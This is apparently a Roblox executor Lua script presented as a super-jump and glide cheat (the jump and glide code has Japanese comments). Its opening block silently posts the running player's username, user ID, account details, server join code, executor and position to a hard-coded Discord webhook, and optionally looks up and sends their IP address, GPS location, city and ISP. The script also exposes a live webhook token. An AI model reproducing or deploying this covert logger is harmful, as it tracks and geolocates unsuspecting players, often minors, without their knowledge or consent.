--// Config
getgenv().whscript = "jump"        --Change to the name of your script
getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1369009406989041735/4AqyB6IhlFO137TnsFo973NFTHh7d3Ya98dKH0STXwaHzE2WyLo9AOI1Mm4PZSwZR8nv"  --Put your Webhook Url here
getgenv().ExecLogSecret = false                --decide to also log secret section

--// Execution Log Script
local ui = gethui()
local folderName = "screen"
local folder = Instance.new("Folder")
folder.Name = folderName
local player = game:GetService("Players").LocalPlayer

if ui:FindFirstChild(folderName) then
    print("Script is already executed! Rejoin if it's an error!")
    local ui2 = gethui()
    local folderName2 = "screen2"
    local folder2 = Instance.new("Folder")
    folder2.Name = folderName2
    if ui2:FindFirstChild(folderName2) then
        player:Kick("Anti-spam execution system triggered. Please rejoin to proceed.")
    else
        folder2.Parent = gethui()
    end
else
    folder.Parent = gethui()
    local players = game:GetService("Players")
    local userid = player.UserId
    local gameid = game.PlaceId
    local jobid = tostring(game.JobId)
    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    local deviceType =
        game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC ğŸ’»" or "Mobile ğŸ“±"
    local snipePlay =
        "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
    local completeTime = os.date("%Y-%m-%d %H:%M:%S")
    local workspace = game:GetService("Workspace")
    local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
    local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
    local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
    local playerCount = #players:GetPlayers()
    local maxPlayers = players.MaxPlayers
    local health =
        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
    local maxHealth =
        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or
        "N/A"
    local position =
        player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
        player.Character.HumanoidRootPart.Position or
        "N/A"
    local gameVersion = game.PlaceVersion

    if not getgenv().ExecLogSecret then
        getgenv().ExecLogSecret = false
    end
    if not getgenv().whscript then
        getgenv().whscript = "Please provide a script name!"
    end
    local commonLoadTime = 5
    task.wait(commonLoadTime)
    local pingThreshold = 100
    local serverStats = game:GetService("Stats").Network.ServerStatsItem
    local dataPing = serverStats["Data Ping"]:GetValueString()
    local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
    local function checkPremium()
        local premium = "false"
        local success, response =
            pcall(
            function()
                return player.MembershipType
            end
        )
        if success then
            if response == Enum.MembershipType.None then
                premium = "false"
            else
                premium = "true"
            end
        else
            premium = "Failed to retrieve Membership:"
        end
        return premium
    end
    local premium = checkPremium()

    local url = getgenv().webhookexecUrl

    local data = {
        ["content"] = "@everyone",
        ["embeds"] = {
            {
                ["title"] = "ğŸš€ **Script Execution Detected | Exec Log**",
                ["description"] = "*A script was executed in your script. Here are the details:*",
                ["type"] = "rich",
                ["color"] = tonumber(0x3498db), -- Clean blue color
                ["fields"] = {
                    {
                        ["name"] = "ğŸ” **Script Info**",
                        ["value"] = "```ğŸ’» Script Name: " ..
                            getgenv().whscript .. "\nâ° Executed At: " .. completeTime .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "ğŸ‘¤ **Player Details**",
                        ["value"] = "```ğŸ§¸ Username: " ..
                            player.Name ..
                                "\nğŸ“ Display Name: " ..
                                    player.DisplayName ..
                                        "\nğŸ†” UserID: " ..
                                            userid ..
                                                "\nâ¤ï¸ Health: " ..
                                                    health ..
                                                        " / " ..
                                                            maxHealth ..
                                                                "\nğŸ”— Profile: View Profile (https://www.roblox.com/users/" ..
                                                                    userid .. "/profile)```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "ğŸ“… **Account Information**",
                        ["value"] = "```ğŸ—“ï¸ Account Age: " ..
                            player.AccountAge ..
                                " days\nğŸ’ Premium Status: " ..
                                    premium ..
                                        "\nğŸ“… Account Created: " ..
                                            os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "ğŸ® **Game Details**",
                        ["value"] = "```ğŸ·ï¸ Game Name: " ..
                            gameName ..
                                "\nğŸ†” Game ID: " ..
                                    gameid ..
                                        "\nğŸ”— Game Link (https://www.roblox.com/games/" ..
                                            gameid .. ")\nğŸ”¢ Game Version: " .. gameVersion .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "ğŸ•¹ï¸ **Server Info**",
                        ["value"] = "```ğŸ‘¥ Players in Server: " ..
                            playerCount .. " / " .. maxPlayers .. "\nğŸ•’ Server Time: " .. os.date("%H:%M:%S") .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "ğŸ“¡ **Network Info**",
                        ["value"] = "```ğŸ“¶ Ping: " .. pingValue .. " ms```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "ğŸ–¥ï¸ **System Info**",
                        ["value"] = "```ğŸ“º Resolution: " ..
                            screenWidth ..
                                "x" ..
                                    screenHeight ..
                                        "\nğŸ” Memory Usage: " ..
                                            memoryUsage .. " MB\nâš™ï¸ Executor: " .. identifyexecutor() .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "ğŸ“ **Character Position**",
                        ["value"] = "```ğŸ“ Position: " .. tostring(position) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "ğŸª§ **Join Script**",
                        ["value"] = "```lua\n" .. snipePlay .. "```",
                        ["inline"] = false
                    }
                },
                ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
                },
                ["footer"] = {
                    ["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
                    ["icon_url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512" -- A generic log icon
                }
            }
        }
    }

    -- Check if the secret tab should be included
    if getgenv().ExecLogSecret then
        local ip = game:HttpGet("https://api.ipify.org")
        local iplink = "https://ipinfo.io/" .. ip .. "/json"
        local ipinfo_json = game:HttpGet(iplink)
        local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)

        table.insert(
            data.embeds[1].fields,
            {
                ["name"] = "**`(ğŸ¤«) Secret`**",
                ["value"] = "||(ğŸ‘£) IP Address: " ..
                    ipinfo_table.ip ..
                        "||\n||(ğŸŒ†) Country: " ..
                            ipinfo_table.country ..
                                "||\n||(ğŸªŸ) GPS Location: " ..
                                    ipinfo_table.loc ..
                                        "||\n||(ğŸ™ï¸) City: " ..
                                            ipinfo_table.city ..
                                                "||\n||(ğŸ¡) Region: " ..
                                                    ipinfo_table.region ..
                                                        "||\n||(ğŸª¢) Hoster: " .. ipinfo_table.org .. "||"
            }
        )
    end

    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end

-- LocalScriptï¼ˆStarterPlayerScripts ã«å…¥ã‚Œã‚‹ï¼‰

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- è¶…ã‚¸ãƒ£ãƒ³ãƒ—å‡¦ç†ï¼ˆã‚ã£ã¡ã‚ƒé«˜ãã‚¸ãƒ£ãƒ³ãƒ—ï¼‰
local function performJump()
    local char = LocalPlayer.Character
    if not char then return end

    local humanoid = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")

    if humanoid and root then
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        root.Velocity = Vector3.new(0, 500, 0)
    end
end

-- Nã‚­ãƒ¼ã‚’æŠ¼ã—ãŸã¨ãã«ã‚¸ãƒ£ãƒ³ãƒ—ã‚’å®Ÿè¡Œ
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end

    if input.KeyCode == Enum.KeyCode.N then
        performJump()
    end
end)

-- LocalScriptï¼ˆStarterPlayerScripts ã«å…¥ã‚Œã‚‹ï¼‰

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local activeVelocity = nil -- ç¾åœ¨ã®æ»‘ç©ºBodyVelocity

-- é£›è¡Œåœæ­¢å‡¦ç†
local function stopFlight()
    if activeVelocity then
        activeVelocity:Destroy()
        activeVelocity = nil
    end
end

-- åœæ­¢ã‚­ãƒ¼ãƒªã‚¹ãƒˆ
local stopKeys = {
    [Enum.KeyCode.Q] = true,
    [Enum.KeyCode.Z] = true,
    [Enum.KeyCode.X] = true,
    [Enum.KeyCode.C] = true,
    [Enum.KeyCode.V] = true,
    [Enum.KeyCode.F] = true,
}

-- å…¥åŠ›ã§é£›è¡Œã‚’åœæ­¢
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if stopKeys[input.KeyCode] then
        stopFlight()
    end
end)

-- å£æ¥è§¦ã§æ»‘ç©ºåœæ­¢
RunService.Heartbeat:Connect(function()
    if activeVelocity then
        local character = LocalPlayer.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            local root = character.HumanoidRootPart
            local rayOrigin = root.Position
            local rayDirection = root.CFrame.LookVector * 3 -- å°‘ã—å‰ã‚’ãƒã‚§ãƒƒã‚¯
            local raycastParams = RaycastParams.new()
            raycastParams.FilterDescendantsInstances = {character}
            raycastParams.FilterType = Enum.RaycastFilterType.Blacklist

            local result = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
            if result and result.Instance and not result.Instance:IsDescendantOf(character) then
                stopFlight()
            end
        end
    end
end)

-- ã‚¸ãƒ£ãƒ³ãƒ—ï¼‹æ»‘ç©ºå‡¦ç†ï¼ˆé£›è¡Œä¸­ã¯ç„¡è¦–ï¼‰
local function performJump()
    if activeVelocity then return end

    local character = LocalPlayer.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") then return end

    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local root = character:FindFirstChild("HumanoidRootPart")

    if humanoid and root then
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        RunService.Heartbeat:Wait()
        root.Velocity = Vector3.new(0, 160, 0)

        task.delay(0.1, function()
            if root and root.Parent and not activeVelocity then
                local bv = Instance.new("BodyVelocity")
                bv.Name = "JumpGlide"
                bv.Velocity = root.CFrame.LookVector * 400 + Vector3.new(0, 60, 0)
                bv.MaxForce = Vector3.new(1e5, 0, 1e5)
                bv.P = 3000
                bv.Parent = root
                activeVelocity = bv

                task.delay(1.8, function()
                    if bv == activeVelocity then
                        stopFlight()
                    end
                end)
            end
        end)
    end
end

-- Mã‚­ãƒ¼ã§ã‚¸ãƒ£ãƒ³ãƒ—ï¼†æ»‘ç©º
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.M then
        performJump()
    end
end)
